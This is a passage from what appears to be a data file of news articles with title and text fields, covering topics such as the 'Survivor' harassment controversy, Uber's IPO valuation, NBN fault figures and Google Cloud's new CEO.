lawyer representing Ms. Kim, contacted CBS late last week to express her concerns. After talks, the network said Ms. Kim would be permitted to speak freely at the reunion special. \nIn a statement this week, CBS also acknowledged that there were \u201cthings we could have done differently\u201d this season, adding that \u201cwe are determined to do better going forward.\u201d The network also announced a series of \u201cSurvivor\u201d production changes \u201cto ensure that the events that occurred this season are not repeated.\u201d \nIn an interview on Wednesday evening, after the reunion taped, Ms. Kim said, \u201cWhat\u2019s really most important is that \u2018Survivor\u2019 and CBS took responsibility and apologized. These changes that I\u2019ve been asking for for many, many months have been put into place, so no one else is going to have to go through something like this.\u201d \nIn an episode that aired last month, which was filmed months ago in Fiji, Ms. Kim said that a fellow contestant, Dan Spilo, had made her uncomfortable by repeatedly touching her without her consent. \u201cSurvivor\u201d broadcast much of the footage of the unwanted contact. \nAfter Mr. Spilo was issued a warning, the contestants were left to their own devices. Ms. Lee was ultimately voted off the show, prompting a backlash and underscoring an on-air statement she had made earlier: \u201cThere are always consequences for standing up.\u201d Mr. Spilo remained on the island for several more episodes. \nIn last week\u2019s episode, Mr. Spilo, a Hollywood talent manager, was removed from the show, as well as from the jury that awards $1 million to the season\u2019s winner. The only explanation for the decision was a title card onscreen saying he had been ejected \u201cafter a report of another incident\u201d that occurred off-camera and did not involve a contestant. In a statement to People on Tuesday, Mr. Spilo apologized . \nEver since, \u201cSurvivor\u201d has been on the receiving end of withering commentary. The New York Times television critic James Poniewozik faulted the show for \u201cthe inept, shameful, evasive way it handled sexual misconduct.\u201d A former \u201cSurvivor\u201d contestant, Zeke Smith \u2014 who applauded the sensitivity that the network and the show had displayed two years ago when he was outed by a fellow contestant as transgender \u2014 also criticized the show. \u201cThis predator could have and should have been stopped long ago, but those in power made a choice not to stop him,\u201d he tweeted last week . \u201cShame on you, Survivor.\u201d \nMs. Kim\u2019s lawyer, Ms. Katz, said in an interview, \u201cSexual harassment should never be used for entertainment value. And what happened in this instance was completely unacceptable.\u201d \nEven with the uproar, ratings have held steady. But many longtime fans have been furious. \n\u201cThere was a lot of shock and horror and numbness,\u201d said Andy Dehnart, the creator of the website Reality Blurred , describing the reaction among \u201cSurvivor\u201d superfans. \u201cAnd there were a lot of questions about how this could happen at all.\u201d \nFor Wednesday\u2019s finale, CBS did not invite Mr. Spilo to the reunion special. \nAs late as of last week, Ms. Katz said, it was unclear what role Ms. Kim would play, as well. \n\u201cKellee was concerned that she was not going to be able to speak at the finale,\u201d Ms. Katz added. \u201cAnd if she was allowed to speak, that it would be too scripted and she would not be able to say the things that were important for her to say.\u201d \nMs. Kim underscored the point by saying she was worried about \u201cwhether I\u2019d get a free, open venue to speak.\u201d \nOn Dec. 13, with Ms. Kim\u2019s role in the finale still up in the air, Ms. Katz emailed CBS and MGM, the studio that makes the show. \n\u201cLet me be clear at the onset: Ms. Kim does not seek compensation,\u201d she wrote. \u201cHer motivation in retaining counsel is to begin a productive dialogue about changes production and CBS must make in future seasons of the show.\u201d \nIn the email, Ms. Katz also described the show\u2019s \u201cserious mishandling\u201d of Ms. Kim\u2019s complaint, she said in an interview. It was not long after sending the email that CBS informed Ms. Kim that she would be permitted to speak freely on the final episode. \nA CBS spokesman said, \u201cThere was never any doubt in our mind that she would be part of it and be able to speak freely about her experience.\u201d The spokesman added that her discussion with Jeff Probst, the show\u2019s longtime host, during the reunion special would be \u201cbroadcast unedited.\u201d \nOn Tuesday, CBS detailed its planned improvements for future seasons of \u201cSurvivor.\u201d One rule will say that unwanted physical contact or sexual harassment will not be allowed. The production will also assign an executive to the set so that contestants can express their concerns confidentially. \nMs. Kim said she was heartened by the response and wanted the network to see it through. \n\u201cI hope that this has been a true learning lesson and things are different going forward, but only time will tell,\u201d she said.",

      "title": "Uber Is Said to Aim for I.P.O. Valuation of Up to $100 Billion",
      "text": "Uber gave the first sign on Wednesday of how big its initial offering might be, telling some investors that its stock sale might value it at up to $100 billion, people briefed on the matter said. \nThe number, which is below a $120 billion valuation that had been floated by investment bankers, highlights the size of the ride-hailing giant as it prepares to embark its market debut, the biggest in recent years. Its shares are expected to begin trading on the public markets next month. \nThe revelation also follows the I.P.O. last month of Uber\u2019s main North American competitor, Lyft, whose shares have dropped more than 15 percent from their offering price. Another Silicon Valley darling, the digital pin board Pinterest this week set pricing expectations for its own market debut below its last private fund-raising round. \nUber is expected to publish its public offering prospectus on Thursday, giving investors a closer look into its businesses. That document will not provide any information on the offering\u2019s potential price, but the company recently disclosed its latest thinking about its own valuation to some investors. \nIn a notice to holders of some of its convertible bonds, Uber said that its stock could be valued at $48 to $55 a share, these people said. That would translate into a valuation of about $90 billion to $100 billion, factoring in the roughly $10 billion that the company expects to raise. \nAt $90 billion, Uber would be valued well above the $76 billion it was appraised at in its most recent fund-raising last August. Investment bankers last year reckoned that the company could fetch a valuation of as much as $120 billion in the public markets. \nThe people briefed on the matter, who asked to remain anonymous because the details were confidential, cautioned that the I.P.O. process was ongoing and that it was too early to determine what Uber\u2019s valuation would ultimately be. The company\u2019s underwriters, led by Morgan Stanley and Goldman Sachs, could still raise the price of the shares \u2014 and therefore its valuation \u2014 in the coming weeks if there is enough interest from prospective shareholders. \nThe potential $100 billion valuation was reported earlier by Reuters and The Wall Street Journal .",

      "text": "Sun Country Airlines Expands to Canada \nOn December 9, 2019, Sun Country Airlines, the Minneapolis based low-cost carrier, announced that it will begin seasonal service to Vancouver, British Columbia in Canada starting next summer. The new route marks the carrier\u2019s first Canadian route in its history. \nThe announcement of the Minneapolis-Vancouver service comes after the announcement of 12 non-stop seasonal routes to the airline\u2019s network earlier this year. Including the new Minneapolis-Vancouver route, Sun Country\u2019s route count increases to 92, which includes 56 airports. Indeed, 2019 has been a major growth year for Sun Country. According to the airline, it has grown its network by 72 percent and expanded into 47 new markets this year. \nSun Country\u2019s Chief Revenue Officer, Grant Whitney, showed enthusiasm for the airline\u2019s expansion into Canada in a press release: \u201cOur expansion into Canada is the latest signal of the incredible growth we\u2019re experiencing at Sun Country Airlines,\u201d he said. \u201cWe are thrilled to be adding Vancouver to our ever-evolving list of routes and believe there is significant demand for low-cost service to this great destination.\u201d \nIn addition to enthusiasm from Sun Country, Vancouver Airport Authority\u2019s Vice President for Airline Business Development and Public Affairs, Anne Murray was also positive about the airline\u2019s new route: \u201cWe\u2019re thrilled to welcome another new airline partner with Sun Country Airlines launching scheduled service at YVR,\u201d she said. \u201cWith the addition of this new service, travelers will have even more options for travel to the United States in time for the summer season.\u201d \nSun Country maintains a fleet of Boeing 737 aircraft from the Next Generation family, including the 737-800 and 737-700. At approximately 1,300 nautical miles, the Minneapolis-Vancouver route will be well suited for the 737. \nSun Country\u2019s new service between Minneapolis and Vancouver begins on May 20, 2020 and will be operated twice a week on Wednesdays and Saturdays. According to Sun Country, one-way fares start as low as $99. \nJordan joined the AG team in 2018 after attending AAviationDay in Philadelphia.He is actively pursuing his private pilot certificate and has been an aviation enthusiast since childhood.An attorney by trade, Jordan jokingly refers to himself as a \u201crecovering litigator\u201d and now focuses on subcontracts management. \nJordan focuses his writing on innovations in commercial aviation, aviation history, and other interesting topics he feels are worthy of discussion in the community. \nLatest posts by Jordan Green ( see all )",

      "title": "Verizon will launch home 5G everywhere its mobile service is available",
      "text": "Verizon (Engadget's parent company) may be rolling out 5G at a pokey pace, but at least you won't have to choose which kind of 5G you get. Consumer division chief Ronan Dunne told investors that fixed 5G Home service will \"in due course\" be available in every market where mobile 5G is available. It's \"one network,\" he said -- there's little stopping Verizon from offering both. The carrier is planning a \"full\" launch for Home late in 2019 using the official 5G standard, so the synchronicity might begin relatively quickly. \nThe initial service ran on an in-house approach to 5G and offers typical speeds of 300Mbps. It won't compete with gigabit fiber, but it's faster than many landline connections and, if you get an indoor antenna, let you set up yourself. \nThe main catch, as always, is the slow pace of 5G deployment. Verizon's current 5G is available in parts of just 10 cities, and it can only roll out so quickly when the ultra-wideband technology requires an extensive number of cell sites to provide solid coverage. That reach should extend to 30 cities before 2019 is over, but that still means it could be a long while before 5G Home comes to your neighborhood. Still, that beats having to deal with the limited coverage of FiOS and other wired high-speed services. \nSource: Verizon",

      "title": "Researchers link snowline migration to icemelt in Greenland",
      "text": "A University study found that the location of the boundary between snow-covered ice and bare ice is the leading factor determining icemelt in Greenland, which is the largest contributor to global sea level rise. \nA team of University researchers mapped the migration of Greenland\u2019s snowline and its effect on the island\u2019s icemelt using thousands of images from NASA\u2019s Terra satellite. In a paper published this month, their results show how Greenland\u2019s icemelt is primarily caused by snowline migration, a phenomenon that has been historically underrepresented in the literature. \nA snowline, in this context, is the physical boundary between bright snow and dark ice. The snow on an ice sheet acts as a protective covering due to its reflective capacity and is characterized as having \u201chigh albedo,\u201d said Jonathan Ryan, the paper\u2019s lead author and a postdoctoral researcher at the Institute at Brown for Environment and Society. Snow reflects 70-80 percent of the solar energy that hits its surface. Ice only reflects 20-50 percent of this energy, leaving it more vulnerable to melt. \n\u201cAs you progress through the summer season, the sun rises to higher angles and so you actually melt some snow \u2026 (exposing) bare glacial ice,\u201d Ryan said. \n\u201cUnbelievably, no one had looked at snowlines of Greenland before. There has been a great deal of attention paid to other properties that darken the ice sheets\u2019 surface \u2014 like dust, algae (and) meltwater pools. They have received a lot of study and a lot of media attention. This study shows, for the first time, that the humble snowline actually controls icemelt five times more than all of those other processes combined,\u201d explained Visiting Professor of Earth, Environmental and Planetary Sciences Laurence Smith, the paper\u2019s co-author. \nThe team\u2019s research, which required analyzing roughly 3,000 images, was made possible using an automated approach. \u201cIt\u2019s impossible for a person to go in and classify every pixel,\u201d Ryan said. The researchers used a classification algorithm to track how Greenland\u2019s snowline migrated in images taken over the past decade. They trained the algorithm to recognize images of snow against images of bare ice. \nRyan\u2019s research specialty is understanding how Greenland\u2019s ice sheet is melting and how it might respond to future climate change. He explained how he came about this project, in part, by spending time on Greenland\u2019s ice sheet. \u201cWe saw in person how dark the ice is, how light the snow is and how fast the snowline migrates.\u201d \nDespite the fact that he was inspired by his time on the ice sheet, Ryan estimates that he spent 95 percent of his time working on this project from his desk. \u201cThis is actually one of the first projects where it has been almost completely done on computers, because I\u2019m using satellite imagery.\u201d \nThis study could improve climate modeling algorithms, which currently struggle to accurately predict snowline migration. \u201cTo predict snowline, you need two things. You need to know how much snow has fallen in the winter, and how much snow is melting during the summer. I have a feeling that models are not getting snowfall right, which throws off their modeling of snowline movement,\u201d Ryan said. \nElizabeth Thomas PhD \u201814, who did not participate in this study, is a paleoclimatologist who works closely with climate models by helping ice sheet modelers understand how ice sheets have changed over time. There are always unaccounted-for processes that models fail to incorporate, she said. \u201cWe just might not quite have the physics right in the models.\u201d \nRyan hopes to use the data from this research to understand why climate models tend to over and under predict the amount of snowfall in Greenland. \u201cHopefully our observation will help constrain the models\u2019 predictions of actual snowfall, in the future.\u201d \nThese researchers intentionally avoided making connections between this project and the larger discussion of climate change in their paper. Climate change \u201cis sort of a contentious issue. What is interesting is that we didn\u2019t really find a trend between 2000 and 2018, which shows that natural variability is responsible for a lot of the changes we\u2019re seeing right now. The climate change signal is very subtle,\u201d Ryan said. \nDespite this signal being \u201csubtle,\u201d these researchers concluded that they reasonably expect icemelt in Greenland to intensify in the future. \u201cWe found that because the slope of the ice sheet flattens out as you go to higher elevations, it is likely that future snowline rises in elevation will create larger areas of bare ice exposure.\u201d If the snowline reaches a higher and therefore flatter elevation, it would expose more bare ice, which is more susceptible to melt since it lacks protective snow cover. \u201cThis means that some parts of the ice sheet may experience 30 percent to 50 percent more melting in the future, simply due to this topographic effect,\u201d Smith said. This is a significant finding, considering that the melting of Greenland\u2019s ice sheet plays a key role in global sea level rise. \nBeyond improving current climate models, these researchers hope to spark interest among scientists about studying the \u201chumble\u201d snowline. \u201cThis study has shown just how important the partitioning between bare ice and snow truly is,\u201d Smith said. \nThomas echoed these thoughts, adding, \u201cThis sort of work is really exploding on Greenland. There is a lot more observation that we\u2019re making on ice sheets these days.\u201d",

      "text": "TF-Images/Getty Images \nToni Kroos took to Twitter on Friday to rubbish reports he's set to leave Real Madrid during the summer transfer window. \nPer DW Sports and Goal, the German midfielder was quick to dismiss the rumours: \nDW Sports @dw_sports \nToni Kroos has quashed media speculation that he wants to leave Madrid \ud83d\udc40 https://t.co/CRdgmA7rvJ \nGoal @goal \nNewspapers: Toni Kroos is leaving Real Madrid @ToniKroos: https://t.co/BJCiQwQMIP \nHe made the remark in response to a report from AS ' Mario Cortegana , who earlier Friday wrote the former Bayern Munich man is looking for a new challenge. Cortegana also reported his poor play has led to \"unprecedented levels of criticism,\" and his departure could both free up some extra wage space for the club and yield a significant transfer fee. \nKroos wasn't the only one who slammed the report, as Sport Bild 's Christian Falk did the same: \nChristian Falk @cfbayern \nNo, @diarioas : @ToniKroos is satisfied in Madrid and does not think about a transfer https://t.co/AyVWt2Nr8a \nThe 29-year-old has played for Real since 2014, forming a tremendous partnership with Luka Modric that has yielded three consecutive UEFA Champions League titles, as well as a La Liga trophy. \nLos Blancos have endured a nightmare 2018-19 campaign, however, and the poor play of Kroos and Modric has been a big part of that. Major changes are expected in the summer, leading to a steady stream of transfer rumours in the Spanish press. \nCortegana linked Real with Manchester United 's Paul Pogba and Tottenham Hotspur 's Christian Eriksen\u2015the two names most frequently mentioned in rumours of late\u2015and noted a Kroos departure would go a long way towards securing the finances needed for such moves. \nSpeculation regarding Pogba and Eriksen has become so regular that it has led to a daily Sport Witness feature: \nSport Witness @Sport_Witness \nThe Daily Paul Pogba | Excessive personality, Christian Eriksen increasingly pulled in, a cunning plan from AS, and L'Equipe are on to Graeme Souness. https://t.co/J5b09bKPkj https://t.co/4zt1JpCUzB \nThat said, the Spanish press has linked a host of players with an exit, and it's unlikely Los Blancos will sell half the squad to fund an overhaul. Departures are expected, but there's no indication Kroos will be a part of that. \nThe expert distributor has been a major part of the team's successes and is in the midst of his prime, and he has always been a favourite of manager Zinedine Zidane. One poor season won't change that, especially considering the team has struggled as a unit.",

      "text": "1 \u2013 \u2018Fine fibre\u2019 first: Kao to release first cosmetic products based on skin hydration technology \u200b \nJapanese cosmetics maker Kao Corporation will launch the first products based on its new \u2018fine-fibre\u2019 technology \u200b in its domestic market from December 4, with an international roll-out following in early 2020. \nKao Corporation first announced the development of its fine fibre technology in 2018. This technology creates a very thin and invisible layer of film on the skin and acts as a moisture barrier to keep skin hydrated. \nKao claimed that this membrane allows for quick and even application of cosmetic products. Additionally, it is able to retain products and moisture while allow skin to breathe. \nThe company worked with technology company Panasonic to develop a handheld diffuser device which consumers can use in the comfort of home. This dispenser uses electrospinning technology to create the film. \nThe company will first launch fine-fibre technology products under its brands est and Sensai as a night time skin care treatment. \n2 \u2013 Thermal power: Shiseido plans to release new sun care products which strengthen with heat \nShiseido plans to release improved sun care products that incorporate its newly discovered technology, which claims to reinforce sun protection with thermal energy generated from the sun. \u200b \nAccording to the Japanese cosmetic maker, sunscreen formulas are most effective when they are molecularly uniform. This led it to research methods of creating an even layer of protection from ultraviolet (UV) rays on the skin. \nIn order to achieve uniformity, the company\u2019s research and development team successfully developed a UV protection technology which evens out when exposed to the sun\u2019s heat. \nAccording to the company\u2019s research, the surface temperature of the skin can hit 40\u00b0C in a matter of minutes. To utilise this \u201cheat energy\u201d, \u200bit developed a thermal energy sensor which starts to work when the skin surface temperature pushes 37\u00b0C. \n\u201cWhen the thermal energy sensor senses heat, it spreads uniformly in the coating film along with UV protection components and maintains a clean state. This way, the UV protection component can fully demonstrate its ability and the UV protection effect is improved,\u201d \u200bthe company explained. \n3 \u2013 L'Or\u00e9al invests in VC fund to strengthen ties with beauty tech start-ups in China \nL'Or\u00e9al has made a strategic investment in global venture capital fund Cathay Innovation to reinforce its connection to the beauty tech start-up ecosystem \u200b, particularly in China. \nThe investment was made through the group\u2019s venture capital fund, BOLD Business Opportunities for L\u2019Or\u00e9al Development, which was launched in December 2018. \nThe fund invests in new business models in marketing, R&I, digital, retail, communication, supply chain and packaging and provides start-ups with L'Or\u00e9al's expertise and networking. Through it, the firm has backed beauty start-ups such as Sampler, Tailify, Riviter and Alegra. \nCathay Innovation is a global venture capital partnership founded by Cathay Capital that invests in digital start-ups in North America, Europe and China. \nThrough the partnership with Cathay Innovation, L'Or\u00e9al hopes to support innovative Chinese beauty tech start-ups during their growth phase. \n4 \u2013 Playing games: J&J-owned Dr. Ci:Labo ramps up travel retail presence to attract more Chinese consumers \nJapanese skin care label Dr. Ci:Labo is tapping into travel retail with a virtual interactive game \u200b targeted at Chinese consumers travelling in South Korea. \nThe game, which is exclusively available in South Korea, can be accessed via Weibo, WeChat and CTrip. It features Chinese celebrity and brand ambassador Liu Yuning and an animated character Dr. Rabbit as they journey though South Korea to \u201csolve pore issues\u201d. \u200b \nUsers can collect points by solving these puzzles and redeem special gifts including a limited-edition bottle signed by Liu Yuning, at selected Korean duty free locations operated by Shinsegae Duty Free, Lotte Duty Free, Doota Duty Free, HDC Shilla Duty Free and Hyundai Department Store. \nSandrine Tesni\u00e8re, head of marketing, media and digital travel retail Johnson & Johnson told CosmeticsDesign-Asia \u200b that it chose to roll out the campaign in South Korea as it still remains a hot destination for Chinese tourists. \n\u201cDr. Ci:Labo has a strong business presence in South Korea, and Chinese consumers continue to travel significantly to that destination. Chinese inbound traffic to Korea was up 28% YTD August vs. last year. So, it made sense to support our retail partners in Korea with this initiative.\u201d \u200b \n5 \u2013 Shiseido expects full-year sales to dip by as much as $275m due to market uncertainties \nJapanese cosmetics maker Shiseido is revising its full-year forecast due to the increasingly challenging business environment \u200b in several markets. \nMichael Coombs, CFO of Shiseido, said during the company\u2019s third quarter presentation that the company was anticipating sales to dip by 25 to 30 billion yen from its previous forecast citing the weak market conditions in Hong Kong, South Korea and the US. \n\u201cExternal challenges that we have identified include FX, growing market uncertainties stemming from US-China trade friction, and sales decreases in Hong Kong and South Korea. Our Japan Business has also been adversely affected by unfavourable weather and other factors.\u201d \u200b \nHowever, Coombs noted that the company is still working towards its original target. \n\u201cWe have not given up on achieving our original target of 120 billion yen in operating profit. We will strengthen our long-term marketing investments, but at the same time we will coordinate with each region to improve cost efficiency in response to the business environment and strive to improve marketing ROI.\u201d \u200b",

      "text": "Mar 29, 2019, 12:43pm PDT \nThe head of the National Association of Attorneys General has confirmed that more than a dozen U.S. states \u2014 including Washington \u2014 are examining T-Mobile's $26.5 billion merger with Sprint. \nSpeaking at the American Bar Association's annual meeting on antitrust law, Sarah Oxenham Allen , chair of the Multistate Antitrust Task Force, said states are acting separately from the federal government in part due to the impact of the deal on urban and rural areas, but the group is coordinating with the U.S. Department of Justice and the Federal Communications Commission, according to Seeking Alpha . \nKeith Snyder , an analyst for New York-based investment research firm CFRA, called the new development \"a substantial risk to this merger.\" \n\"The unprecedented nature of states acting independently from the DOJ poses substantial risk of delay to the deal being closed,\" he said. \nSprint and T-Mobile shares have tumbled this week as rumors of a pending lawsuit rumbled . \nSnyder said there is a 50-50 chance the deal will go through. \n\"I don't know what the states would be able to dig up that the DOJ didn't use in their analysis,\" he said. \"I don't think the DOJ would overlook anything or give an undue underweight to any competitive factors to get the deal approved. I think they're much more nonpartisan (than the FCC). They follow the data.\" \nIt's unclear how many states will proceed with a lawsuit to block the union between the third- and fourth-biggest wireless carriers in the nation. However, on Feb. 28, the FCC filed a public notice that 14 state attorneys generals' offices and the District of Columbia had sought information in connection with their investigation of the proposed merger. \nThe states are: \nNew York \nCalifornia \nAlabama \nConnecticut \nFlorida \nHawaii \nMississippi \nTennessee \nVirginia \nWashington \nWisconsin \nColorado \nIowa \nMaryland \nMassachusetts \nDistrict of Columbia",

      "text": "PHILIPPE HUGUEN/Getty Images \nDean Ambrose will reportedly get left off the WrestleMania 35 card on April 7 with his WWE contract set to expire shortly after the company's biggest show of the year. \nOn Monday, Randall Ortman of Cageside Seats reported Ambrose, who signed with WWE in April 2011 and made his main-roster debut at Survivor Series in November 2012 as part of The Shield, \"is not expected to appear on television going forward, and likely will not work WrestleMania 35 either.\" \nThe 33-year-old Cincinnati native last appeared on the March 11 edition of Raw. He lost to Drew McIntyre in a Falls Count Anywhere match and then suffered a post-match beatdown, which is typically the way WWE writes a character off television. \nHe's continued to appear at live events, per WhatCulture , but there's been no indication he'll return to TV in time for a WrestleMania feud. \nAmbrose, real name Jonathan Good, began his rise toward wrestling stardom while working on the independent scene as Jon Moxley. \nHis successful WWE stint included becoming a Grand Slam champion by winning the WWE Championship, Intercontinental Championship (three reigns), United States Championship and the Raw Tag Team Championships alongside Seth Rollins twice. \nThe Shield, featuring Ambrose, Rollins and Roman Reigns, reunited one final time for the Fastlane pay-per-view March 10 and defeated the trio of McIntyre, Baron Corbin and Bobby Lashley. It will seemingly go down as Ambrose's final PPV match with WWE. \nHis legacy will live on, however, with The Shield considered one of the greatest factions in wrestling history.",

      "text": "I may have just coined a new job title\u2026? \nI\u2019ve been using this job title for several months now. On my website . In my portfolio . In talks and presentations . Even when I meet new people. \nThe thing is, the term \u201cCultural Data Scientist\u201d doesn\u2019t exist. I just made it up. \nI am a data scientist who uses statistics, econometrics, machine learning, urban analytics, social media analytics and data visualization to understand and measure the economic and social impact of culture in cities. \nBut that\u2019s obviously a bit of a mouthful, especially when I\u2019m at the pub chatting with someone who doesn't know the definitions of any of those jargon terms. \nSo, I thought I\u2019d write a blog post about it. \nWhat is Culture? \nCulture is one of those seriously loaded terms. The definition is split halfway between \u201cthe arts\u201d and \u201csocial behaviour\u201d, but it is a term that refers to us collectively. \nThe Oxford Dictionary definition of Culture is: \nThe arts and other manifestations of human intellectual achievement regarded collectively. \nThe ideas, customs, and social behaviour of a particular people or society. \nWikipedia describes Culture as the \u201csocial behaviour and norms found in human societies.\u201d \nThe UK Government Department for Digital, Culture, Media and Sports (DCMS) has a whole section which looks at the \u201ccultural and creative\u201d industries, which includes the Arts; Film, TV, and music; Radio; Photography; Crafts; Museums and galleries; Library and archives; Cultural education; and Operation of historic buildings and similar visitor attractions; Advertising and marketing; Architecture; Crafts; Design and designer fashion. \nAnnoyingly, the business world also seems to be hijacking the word recently . \nWhat is Data Science? \nData science is a discipline where data is used and analyzed to test hypotheses, answer questions and understand insights. \nData science is a \u201cconcept to unify statistics, data analysis, machine learning and their related methods\u201d in order to \u201cunderstand and analyze actual phenomena\u201d with data. \nCultural Data Scientist \nThe job title Cultural Data Scientist , therefore, quite nicely sums up what I do. \nI am a data scientist who uses statistics, econometrics, machine learning, urban analytics, social media analytics and data visualization to understand and measure the economic and social impact of culture in cities. \nMy research focus on culture started out with the arts but is now quite broad and spans across the arts to music , fashion , and food. \nThe job title is much better than \u201cI\u2019m a Data Scientist for the cultural sector\u201d . \nComparables \nMuch like how you can be an Economic Consultant, Financial Consultant, Software Engineer, Machine Learning Engineer, or Civil Engineer\u2026 \nI am a Cultural Data Scientist. \nMaybe I\u2019m being pedantic? \nBut the truth is, the people who I deal with on a day to day basis\u200a\u2014\u200apeople in the arts and cultural sector\u200a\u2014\u200atend not to even know what a Data Scientist is! \nPlacing \u201c Cultural \u201d in front of \u201c Data Scientist \u201d creates a distinction that is not only unique and interesting but also helpful to contextualise my work. \nResearch \nTo prove that the job title Cultural Data Scientist doesn\u2019t exist, I\u2019ll link to a few popular and well-used search engines. \nAccording to Google Trends\u200a\u2014\u200a here \u200a\u2014\u200athe term doesn\u2019t exist (retrieved on 11th February 2019). \nLinkedIn\u200a\u2014\u200a here \u200a\u2014\u200athere isn\u2019t anyone else with that job title (retrieved on 11th February 2019). \nThere was also no jobs on Angel List with that job title\u200a\u2014\u200a here (retrieved on 11th February 2019). \nEven a standard Google search doesn\u2019t yield the term. \nCultural Analytics and Cultural Data Science \nAdmitadely, there are people using the term \u201ccultural analytics\u201d and a few universities who are using \u201ccultural data science\u201d. \nThe term Cultural Analytics , invented by Lev Manovich in 2007, is \u201cthe exploration and analysis of massive cultural data sets of visual material\u201d. \nOn the other hand, McGill Univerity in Montreal, Canada has a Centre for Social and Cultural Data Science . \nImperial College in London has a Social and Cultural Analytics Lab but their Twitter account hasn\u2019t tweeted once since 30 October 2015! Seriously poor effort! \nThe Bartlett at UCL, the faulty I am currently studying at, is releasing a new Masters degree called Data Science for Cultural Heritage . \nBut interesting, there isn\u2019t anyone using the job title Cultural Data Scientist . \nDid I just coin a new job title\u2026? \nI wasn't able to find anyone who was actively using the job title Cultural Data Scientist as of March 2019. \nThe term is needed. As we move into 2020, Culture is becoming more digital, larger data sets now exist, and there are more sophisticated methods to analyse that data. \nIf universities are creating these research labs then people should feel comfortable using the job title Cultural Data Scientist to describe the work their doing. \nIn my opinion, the word social scientist just won\u2019t do and data scientist is too broad. Computational Social Scientist is a thing, but which social science are you referring to\u2026 Geography, Economics, Anthropology, Sociology, Psychology, Political Science\u2026all of them? \nIn any case, it looks like I\u2019ve just coined a new job title, and it\u2019s something I am going to stick with for some time! I encourage you to use it as well if your work fits the bill! \nThanks for reading! \nVishal \nThis article first appeared on vishalkumar.london on 10th March 2019. \nVishal is a Cultural Data Scientist and Research Student at The Bartlett at UCL in London. He is interested in the economic and social impact of culture in cities. You can get in touch with him on Twitter or LinkedIn .

      "text": "Fibre-to-the-premises (FttP) is the least faulty technology in NBN's arsenal, according to figures disclosed by the company. \nResponding to Senate Estimates Questions on Notice, the company responsible for the National Broadband Network (NBN) broke down its 409,821 faults lodged in fiscal year 17-18 by technology. \nIn absolute terms, fibre-to-the-node (FttN) led the way with 216,000 faults, followed by HFC with 84,300, and FttP with 75,000. NBN's most recently launched technology choice , fibre-to-the-curb (FttC), had only 81 faults, while fibre-to-the-basement (FttB) had 6,800 faults lodged, satellite had 6,000, and fixed wireless had 21,000. \nWhen translated to faults per 100 active premises, the technology in the order of most faults to least are: HFC, FttC, FttN, fixed wireless, FttB, satellite, and FttP. \nNBN noted the period covered its HFC pause , where sales on the network were stopped while it was remediated, and since its relaunch , faults have occurred at a rate of 1.4 faults per active premises, which would place it between FttC on 1.6 and FttN on 1.2. \nOverall, the fault rate for fiscal year 17-18 sat at 1 fault per 100 active premises per month, while for 16-17 the rate was 0.89, and from July 2018 to the end of February the overall fault rate was 0.91. \nCustom remediation means 90% chance of NBN resolving your issue in 2 years \nIf you feel you are in a bad place with your connection to the NBN, spare a thought for the unlucky people on NBN Co's custom remediation list. \nAccording to the company, custom remediation is used for premises that need to have long cable runs replaced, involve construction work, or need to be redesigned to move to another technology. \n\"NBN Co aims to resolve 90 percent of cases within 2 years of opening. This timeframe allows NBN Co to conduct detailed investigation, and custom design and build works on a case-by-case basis to remediate premises,\" the company said in response to Senate Estimates Questions on Notice. \nNBN added it had 713 custom remediation cases awaiting resolution, and had completed 10 cases. \nIn another question, NBN said around 7.6% of its FttN services were unable to reach the mandated 25Mbps minimum speeds, however some lines were in the coexistence period where FttN connections ran slower due to needing to continue support for legacy services over copper, such as ADSL, during an 18-month migration window. \n\"The actual experience of customers using the network, can be impacted by other factors such as their in-home set-up and equipment,\" NBN said. \n\"Where the network is not capable of providing the minimum wholesale download speeds after co-existence has ended, NBN will take action to rectify any issues in its network so that minimum standards are met.\" \nPreviously the company said in August 2017 that 6% of FttN connections could not reach 25Mbps. \nNBN added it was running speed assurance trails for FttN connections that were deemed at risk of not hitting 25Mbps, with the broadband wholesaler saying that if a line suffered a 20% drop in downstream or upstream performance, then the retailer could log a fault for NBN to investigate. \nEarlier this week, the NBN disclosed it had almost doubled the total amount of copper it has purchased since October 22, 2017. \nAs at 19 February 2019, NBN Co has purchased 29,460km of copper cable, which has typically been used for the link between existing pillars and new nodes.\", the company said in response to a Senate Estimates Questions on Notice published this week. \n\"A significant proportion of this figure is also due to FTTC network construction for short extensions of copper lead-in cables to the FTTC DPU location.\" \nThe company also revealed that less than half of the premises in its fixed wireless areas had taken up such services, and fibre-to-the-node (FttN) uptake was tracking lower than the company needed to meet its financial goals. \nRelated Coverage \nIt is well on the way to hitting the 40,000km milestone of being able to circle the planet at the equator. \nThe subsidy charge to help fund the NBN's loss-making satellite and fixed-wireless regional networks has been reduced from AU$10 to AU$7.10 a month. \nThe government will fund two more mobile blackspots rounds with AU$160 million, and a Regional Connectivity Program with AU$60 million. \nIn its submission to the ACCC, Optus has joined Telstra, Vodafone, and Vocus in arguing that a AU$25 one-off rebate is not enough to incentivise NBN to repair faults in a timely way and stop missing connection appointments. \nSubmissions to the ACCC on its NBN rebate inquiry have shown that Vocus, Telstra, and Vodafone all have issues with the current wholesale service standards.",

      "title": "New Google Cloud CEO Thomas Kurian lays out his vision for the vendor",
      "text": "Share \nTwitter \nFacebook \nLinkedIn \nSince being appointed in November as Diane Greene's successor as the CEO of Google Cloud, Thomas Kurian has kept a low public profile, doing little press and embarking on a broad listening brief across a business he believes can compete with the market leader Amazon Web Services (AWS). \nThis week during Google Cloud's flagship Next conference in San Francisco was many people's first chance to get a read on who many internally already refer to as TK. Was he going to reflect the hard-nosed values of his long-time employer Oracle, or was Kurian cut from a different cloth? \nDressed in a steel blue suit and open collared white shirt, it was a low-key keynote performance from Kurian on day one, where he was introduced by Google CEO Sundar Pichai. He started by thanking Diane Green for her service to the company before her recent retirement, and moved on to talk about the big day one announcement of Anthos , a platform that allows customers to run applications on-premise, in the Google Cloud and, crucially, with other major public cloud providers like Microsoft Azure and AWS. \nThe rest of the keynote leant heavily on his colleagues and partners - many of whom talked about having worked with Kurian before during his time at Oracle - showing his status as a Silicon Valley insider, while also signalling a Satya Nadella-like commitment to openness which will be a positive sign for anyone looking for remnants of an aggressive Oracle-style approach to enterprise sales. \nOpenness \n\"Our goal has always been simple: you have to have the best technology and the easiest to adopt solutions that give customers choice. If you do, they will choose you, if you don't, eventually they will be unhappy,\" he told Computerworld UK during a press roundtable this week. \nOn stage the closest he got to taking shots at the competition was in his assessment of Google's open source strategy. \"Google has a long history of developing technology and making it available in open source to foster innovation,\" he said. \"Recently the open source community has found cloud providers are not partnering with them, but attempting to take away their ability to 